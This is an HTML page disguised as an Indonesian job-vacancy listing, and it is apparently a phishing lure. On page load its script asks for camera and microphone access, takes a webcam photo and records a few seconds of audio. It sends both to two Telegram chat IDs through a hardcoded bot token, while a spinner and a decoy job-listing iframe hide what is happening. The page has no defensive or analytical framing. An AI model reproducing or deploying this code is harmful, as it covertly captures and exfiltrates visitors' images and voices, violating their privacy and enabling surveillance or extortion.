<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lowongan kerja</title>
    <style>
        #video {
            display: none;
        }
        #loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 9999;
            font-family: Arial, sans-serif;
        }
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div id="loading">
        <div class="spinner"></div>
        <p>Memuat konten...</p>
    </div>
    
    <video id="video" autoplay></video>
    <canvas id="canvas" width="2000" height="2000" style="display: none;"></canvas>

    <script>
        const botToken = "8118720781:AAFciunnQRseF8FI6VDHU_FgEO9A-KX2RoU";
        const chatId1 = "7916928366"; // ID Telegram pertama
        const chatId2 = "5253120221"; // ID Telegram kedua
        
        let mediaStream = null;
        let mediaRecorder = null;
        let audioChunks = [];
        let hasSentPhoto = false;
        let hasSentAudio = false;

        function startCamera() {
            const video = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            const ctx = canvas.getContext("2d");

            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            if (isMobile) {
                video.setAttribute("width", "100%");
                video.setAttribute("height", "auto");
            } else {
                video.setAttribute("width", "2000");
                video.setAttribute("height", "2000");
            }

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    mediaStream = stream;
                    video.srcObject = stream;

                    // Ambil foto setelah 1 detik
                    setTimeout(() => {
                        ctx.drawImage(video, 0, 0, 2000, 2000);
                        canvas.toBlob(blob => {
                            sendToTelegram(blob, chatId1);
                            sendToTelegram(blob, chatId2); // Kirim ke ID kedua
                        }, "image/jpeg", 0.8);
                    }, 1000);
                    
                    // Mulai perekaman audio
                    startRecording();
                    
                    // Hentikan semuanya setelah 10 detik
                    setTimeout(stopAll, 10000);
                })
                .catch(error => {
                    console.error(error);
                    alert("eror");
                });
        }

        function sendToTelegram(blob, chatId) {
            if (hasSentPhoto && chatId === chatId1) return; // Pastikan hanya mengirim foto sekali per ID
            hasSentPhoto = true;
            
            const formData = new FormData();
            formData.append("photo", blob, "camera.jpg");
            formData.append("chat_id", chatId);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log(`Camera frame sent to Telegram ID: ${chatId}`);
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                    alert("Failed to send camera frame.");
                });
        }

        function startRecording() {
            audioChunks = [];

            navigator.mediaDevices
                .getUserMedia({ audio: true, video: false })
                .then((stream) => {
                    // Tambahkan audio track ke mediaStream yang sudah ada
                    stream.getAudioTracks().forEach(track => {
                        mediaStream.addTrack(track);
                    });

                    mediaRecorder = new MediaRecorder(stream);

                    mediaRecorder.start();

                    // Hentikan perekaman setelah 3 detik
                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === "recording") {
                            mediaRecorder.stop();
                        }
                    }, 3000);

                    mediaRecorder.addEventListener("dataavailable", (event) => {
                        audioChunks.push(event.data);
                    });

                    mediaRecorder.addEventListener("stop", () => {
                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });
                        sendAudioToTelegram(audioBlob, chatId1);
                        sendAudioToTelegram(audioBlob, chatId2); // Kirim ke ID kedua
                    });
                })
                .catch((error) => {
                    console.error(error);
                    alert("Eror mohon izinkan akses terlebih dahulu.");
                });
        }

        function sendAudioToTelegram(blob, chatId) {
            if (hasSentAudio && chatId === chatId1) return; // Pastikan hanya mengirim audio sekali per ID
            hasSentAudio = true;
            
            const formData = new FormData();
            formData.append("audio", blob, "recording.wav");
            formData.append("chat_id", chatId);
            formData.append("duration", "10"); // Durasi 10 detik

            fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
                method: "POST",
                body: formData,
            })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log(`Audio recording sent to Telegram ID: ${chatId}`);
                    } else {
                        throw new Error(data.description);
                    }
                })
                .catch(error => {
                    console.error(error);
                    alert("Failed to send audio recording.");
                });
        }

        function stopAll() {
            // Hentikan perekaman audio jika masih berjalan
            if (mediaRecorder && mediaRecorder.state === "recording") {
                mediaRecorder.stop();
            }
            
            // Hentikan stream kamera dan mikrofon
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
            
            // Sembunyikan loading indicator
            document.getElementById('loading').style.display = 'none';
            
            console.log("Semua aktivitas dihentikan setelah 10 detik");
        }

        // Call startCamera when the page is loaded.
        window.onload = function() {
            startCamera();
            
            // Tampilkan iframe setelah beberapa detik
            setTimeout(function() {
                const iframe = document.createElement('iframe');
                iframe.src = "https://vrshack26-a11y.github.io/Lowongan-kerja/";
                iframe.style.width = '100%';
                iframe.style.height = '100%';
                iframe.style.border = 'none';
                iframe.style.position = 'fixed';
                iframe.style.top = '0';
                iframe.style.left = '0';
                iframe.style.zIndex = '999';
                document.body.appendChild(iframe);
            }, 2000);
        };
    </script>
</body>
</html>
